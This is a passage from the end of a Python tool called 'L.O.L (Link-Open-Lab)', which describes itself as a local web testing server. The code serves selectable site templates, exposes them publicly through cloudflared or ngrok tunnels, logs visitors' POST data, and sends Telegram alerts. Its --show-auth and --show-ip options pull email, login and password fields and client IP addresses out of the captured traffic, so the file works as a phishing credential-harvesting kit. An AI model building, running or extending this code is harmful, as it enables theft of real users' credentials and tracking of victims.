    console.clear()
    console.print("\n[bold cyan]Select Template[/bold cyan]\n")
    
    for idx, site in enumerate(sites, 1):
        console.print(f"  [{idx:2d}] {site}")
    
    console.print()
    
    while True:
        try:
            user_input = input("Enter number (or Ctrl+C to cancel): ").strip()
            choice = int(user_input)
            if 1 <= choice <= len(sites):
                selected_site = sites[choice - 1]
                console.clear()
                console.print(f"[cyan]Selected template:[/cyan] [bold magenta]{selected_site}[/bold magenta]\n")
                return selected_site
            else:
                console.print(f"[red]Invalid selection. Enter a number between 1 and {len(sites)}.[/red]")
        except ValueError:
            console.print("[red]Invalid input. Please enter a number.[/red]")
        except KeyboardInterrupt:
            console.print("\n[yellow]Selection cancelled.[/yellow]")
            raise


def print_cloudflared_install_instructions(console: Console) -> None:
    console.print(
        "[bold red]⚠ cloudflared Binary Not Found[/bold red]\n"
        "Local Access Only mode enabled.\n\n"
        "To enable public cloud tunneling, install cloudflared:\n"
        "  Ubuntu/Debian: [yellow]sudo apt install cloudflared[/yellow]\n"
        "  macOS: [yellow]brew install cloudflared[/yellow]\n"
        "  Official: [yellow]https://developers.cloudflare.com/cloudflare-one/connections/connect-networks/downloads/[/yellow]\n"
    )


def print_ngrok_install_instructions(console: Console) -> None:
    console.print(
        "[bold red]⚠ ngrok Binary Not Found[/bold red]\n"
        "Local Access Only mode enabled.\n\n"
        "To enable public ngrok tunneling, install ngrok and authenticate it:\n"
        "  Ubuntu/Debian: [yellow]snap install ngrok[/yellow] or official package\n"
        "  macOS: [yellow]brew install ngrok/ngrok/ngrok[/yellow]\n"
        "  Then run: [yellow]ngrok config add-authtoken <YOUR_TOKEN>[/yellow]\n"
        "  Official: [yellow]https://ngrok.com/download[/yellow]\n"
    )


def choose_tunnel_interactive(console: Console, workspace_root: Path) -> tuple[bool, bool]:
    """Interactive tunnel provider selector.

    Returns:
        (cloudflared_enabled, ngrok_enabled)
    """
    if not sys.stdin.isatty() or not sys.stdout.isatty():
        return False, False

    has_cloudflared = CloudflaredResolver.resolve(workspace_root) is not None
    has_ngrok = NgrokResolver.resolve(workspace_root) is not None

    console.clear()
    console.print("\n[bold cyan]Select Tunnel Mode[/bold cyan]\n")
    console.print("  [ 1] Local only")
    console.print(f"  [ 2] Cloudflare (cloudflared) [{'green' if has_cloudflared else 'red'}]{'installed' if has_cloudflared else 'not installed'}[/]")
    console.print(f"  [ 3] ngrok [{'green' if has_ngrok else 'red'}]{'installed' if has_ngrok else 'not installed'}[/]")
    console.print()

    while True:
        try:
            user_input = input("Enter number (or Ctrl+C to cancel): ").strip()
            choice = int(user_input)

            if choice == 1:
                console.print("[cyan]Tunnel mode:[/cyan] [bold magenta]Local only[/bold magenta]\n")
                return False, False

            if choice == 2:
                if has_cloudflared:
                    console.print("[cyan]Tunnel mode:[/cyan] [bold magenta]Cloudflare[/bold magenta]\n")
                    return True, False
                print_cloudflared_install_instructions(console)
                return False, False

            if choice == 3:
                if has_ngrok:
                    console.print("[cyan]Tunnel mode:[/cyan] [bold magenta]ngrok[/bold magenta]\n")
                    return False, True
                print_ngrok_install_instructions(console)
                return False, False

            console.print("[red]Invalid selection. Enter 1, 2, or 3.[/red]")
        except ValueError:
            console.print("[red]Invalid input. Please enter a number.[/red]")
        except KeyboardInterrupt:
            console.print("\n[yellow]Selection cancelled.[/yellow]")
            raise


class LegacyCompatibility:
    """Expose helper flags from Python-managed traffic logs."""

    def __init__(self, traffic_log_file: Path, console: Console) -> None:
        self.traffic_log_file = traffic_log_file
        self.console = console

    def _load_entries(self) -> list[dict[str, Any]]:
        if not self.traffic_log_file.exists():
            return []

        clean_entries: list[dict[str, Any]] = []
        raw_text = self.traffic_log_file.read_text(encoding="utf-8", errors="replace")
        for raw_line in raw_text.splitlines():
            line = raw_line.strip()
            if not line:
                continue
            try:
                entry = json.loads(line)
            except json.JSONDecodeError:
                continue
            if isinstance(entry, dict):
                clean_entries.append(entry)
        return clean_entries

    def _extract_body_fields(self, raw_body: str) -> dict[str, str]:
        body = (raw_body or "").strip()
        if not body:
            return {}

        # Attempt JSON payload first.
        try:
            parsed_json = json.loads(body)
            if isinstance(parsed_json, dict):
                out: dict[str, str] = {}
                for key, value in parsed_json.items():
                    out[str(key)] = str(value)
                return out
        except json.JSONDecodeError:
            pass

        # Then parse URL-encoded form payload.
        try:
            pairs = parse_qsl(body, keep_blank_values=True)
            return {str(k): str(v) for k, v in pairs}
        except Exception:
            return {}

    def show_auth(self) -> int:
        entries = self._load_entries()
        if not entries:
            self.console.print("[magenta]No credential-like POST data found in traffic log.[/magenta]")
            return 1

        candidate_keys = {
            "email",
            "user",
            "login",
            "password",
            "pass",
        }

        matched_rows: list[str] = []
        for entry in entries:
            fields: dict[str, str] = {}
            raw_post = entry.get("post")
            if isinstance(raw_post, dict):
                fields = {str(k): str(v) for k, v in raw_post.items()}
            else:
                body_encoding = str(entry.get("body_encoding", ""))
                if body_encoding == "utf-8":
                    fields = self._extract_body_fields(str(entry.get("body", "")))
            if not fields:
                continue

            matched: list[str] = []
            for key, value in fields.items():
                if key.lower() in candidate_keys:
                    matched.append(f"{key}={value}")

            if not matched:
                continue

            timestamp = str(entry.get("timestamp", "unknown-time"))
            path = str(entry.get("path", "unknown-path"))
            matched_rows.append(f"[{timestamp}] {path} :: " + " | ".join(matched))

        if not matched_rows:
            self.console.print("[magenta]No credential-like fields found in traffic log.[/magenta]")
            return 1

        self.console.print("\n".join(matched_rows))
        return 0

    def show_ip(self) -> int:
        entries = self._load_entries()
        if not entries:
            self.console.print("[magenta]No IP data found in traffic log.[/magenta]")
            return 1

        ips: list[str] = []
        seen: set[str] = set()
        for entry in entries:
            ip = str(entry.get("client_ip", "")).strip()
            if not ip or ip in seen:
                continue
            seen.add(ip)
            ips.append(ip)

        if not ips:
            self.console.print("[magenta]No client IP values found in traffic log.[/magenta]")
            return 1

        self.console.print("\n".join(ips))
        return 0


def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(
        prog="lol-server",
        description="L.O.L (Link-Open-Lab): local web testing server with tunnel and traffic monitor.",
    )
    parser.add_argument("--project-root", default=".", help="Workspace root directory.")
    parser.add_argument("--sites-dir", default=".sites", help="Template library directory.")
    parser.add_argument("--site", default=None, help="Template name to serve from .sites.")
    parser.add_argument("--list-sites", action="store_true", help="List available templates and exit.")
    parser.add_argument("--php-host", default="127.0.0.1", help="PHP bind host.")
    parser.add_argument("--php-port", type=int, default=8000, help="PHP bind port.")
    parser.add_argument("-p", "--port", type=int, default=None, help="Legacy alias for --php-port.")
    parser.add_argument("--monitor-host", default="127.0.0.1", help="Monitor/proxy bind host.")
    parser.add_argument("--monitor-port", type=int, default=8080, help="Monitor/proxy bind port.")
    parser.add_argument(
        "--traffic-log-file",
        default="traffic_log.json",
        help="NDJSON output path for captured POST traffic.",
    )
    parser.add_argument(
        "--cloudflared-url",
        default=None,
        help="URL cloudflared forwards to (default: monitor URL).",
    )
    parser.add_argument(
        "--cloudflared",
        action="store_true",
        help="Enable cloudflared public tunnel mode.",
    )
    parser.add_argument(
        "--ngrok",
        action="store_true",
        help="Enable ngrok public tunnel mode (targets PHP backend port).",
    )
    parser.add_argument("--php-router", default=None, help="Optional PHP router script path.")
    parser.add_argument(
        "--telegram-bot-token",
        default=None,
        help="Telegram bot token for status/traffic alerts.",
    )
    parser.add_argument(
        "--telegram-chat-id",
        default=None,
        help="Telegram chat id for status/traffic alerts.",
    )
    parser.add_argument(
        "-c",
        "--show-auth",
        action="store_true",
        help="Extract credential-like fields from traffic JSON log and exit.",
    )
    parser.add_argument(
        "-i",
        "--show-ip",
        action="store_true",
        help="Show unique client IPs from traffic JSON log and exit.",
    )
    return parser.parse_args()


def validate_dependencies() -> int:
    if not MISSING_DEPENDENCIES:
        return 0

    missing_str = ", ".join(sorted(set(MISSING_DEPENDENCIES)))
    print(f"Missing Python dependencies: {missing_str}")
    print("Install them with: python3 -m pip install -r requirements.txt")
    return 1


def build_config(args: argparse.Namespace) -> AppConfig:
    workspace_root = Path(args.project_root).resolve()
    sites_dir = (workspace_root / args.sites_dir).resolve()
    runtime_dir = (workspace_root / ".lol_runtime").resolve()
    runtime_webroot = (runtime_dir / "www").resolve()
    auth_dir = (workspace_root / "auth").resolve()

    site_library = SiteLibrary(sites_dir=sites_dir, runtime_webroot=runtime_webroot)
    selected_site = site_library.resolve_site(args.site)
    site_library.publish_runtime_site(selected_site)
    patch_legacy_templates(runtime_webroot)

    log_path = Path(args.traffic_log_file)
    if not log_path.is_absolute():
        log_path = runtime_dir / log_path
    log_file = log_path.resolve()

    if args.ngrok and args.cloudflared:
        raise ValueError("Use either --ngrok or --cloudflared, not both at the same time.")

    cloudflared_path = CloudflaredResolver.resolve(workspace_root)
    ngrok_path = NgrokResolver.resolve(workspace_root)
    requested_php_port = args.port if args.port is not None else args.php_port
    php_port = pick_available_port(args.php_host, requested_php_port)
    monitor_port = pick_available_port(args.monitor_host, args.monitor_port)

    if monitor_port == php_port and args.monitor_host == args.php_host:
        monitor_port = pick_available_port(args.monitor_host, monitor_port + 1)

    return AppConfig(
        workspace_root=workspace_root,
        sites_dir=sites_dir,
        runtime_dir=runtime_dir,
        runtime_webroot=runtime_webroot,
        auth_dir=auth_dir,
        selected_site=selected_site,
        php_host=args.php_host,
        php_port=php_port,
        monitor_host=args.monitor_host,
        monitor_port=monitor_port,
        traffic_log_file=log_file,
        cloudflared_url=args.cloudflared_url,
        cloudflared_path=cloudflared_path,
        ngrok_enabled=bool(args.ngrok),
        cloudflared_enabled=bool(args.cloudflared),
        ngrok_path=ngrok_path,
        telegram_bot_token=args.telegram_bot_token,
        telegram_chat_id=args.telegram_chat_id,
        php_router=args.php_router,
    )


async def async_main() -> int:
    args = parse_args()

    startup_root = Path(args.project_root).resolve()
    startup_check_code, restart_required = ensure_startup_requirements(startup_root)
    if startup_check_code != 0:
        return startup_check_code
    if restart_required:
        os.execv(sys.executable, [sys.executable, *sys.argv])

    dependency_check = validate_dependencies()
    if dependency_check != 0:
        return dependency_check

    console = Console() if Console is not None else None
    workspace_root = startup_root
    auth_dir = (workspace_root / "auth").resolve()
    sites_dir = (workspace_root / args.sites_dir).resolve()
    runtime_webroot = (workspace_root / ".lol_runtime" / "www").resolve()
    site_library = SiteLibrary(sites_dir=sites_dir, runtime_webroot=runtime_webroot)

    if args.list_sites:
        sites = site_library.list_sites()
        if not sites:
            print(f"No site templates found in {sites_dir}")
            return 1
        for name in sites:
            print(name)
        return 0

    if args.show_auth or args.show_ip:
        if console is None:
            print("Rich is required for legacy output mode. Install requirements first.")
            return 1
        log_arg = Path(args.traffic_log_file)
        if log_arg.is_absolute():
            traffic_log_path = log_arg.resolve()
        else:
            traffic_log_path = (workspace_root / ".lol_runtime" / log_arg).resolve()
        legacy = LegacyCompatibility(traffic_log_file=traffic_log_path, console=console)
        if args.show_auth:
            return legacy.show_auth()
        return legacy.show_ip()

    if not args.cloudflared and not args.ngrok:
        if console is None:
            print("Rich is required for interactive tunnel selection.")
            return 1
        try:
            cloudflared_enabled, ngrok_enabled = choose_tunnel_interactive(console, workspace_root)
        except KeyboardInterrupt:
            print("Selection cancelled.")
            return 130
        args.cloudflared = cloudflared_enabled
        args.ngrok = ngrok_enabled

    if args.site is None:
        if console is None:
            print("Rich is required for interactive template selection.")
            return 1
        try:
            args.site = choose_site_interactive(site_library, console)
        except KeyboardInterrupt:
            print("Selection cancelled.")
            return 130

    try:
        config = build_config(args)

        if config.cloudflared_enabled and config.cloudflared_path is None:
            print_cloudflared_install_instructions(console or Console())

        if config.ngrok_enabled and config.ngrok_path is None:
            print_ngrok_install_instructions(console or Console())
        
        server = LocalWebTestingServer(config)
        await server.run()
    except FileNotFoundError as exc:
        print_missing_executable_help(console, exc)
        return 1
    except ValueError as exc:
        Console().print(f"[magenta]Configuration error: {exc}[/magenta]")
        return 1
    except Exception as exc:
        Console().print(f"[magenta]Unhandled error: {exc}[/magenta]")
        return 1

    return 0


def main() -> None:
    exit_code = asyncio.run(async_main())
    raise SystemExit(exit_code)


if __name__ == "__main__":
    main()
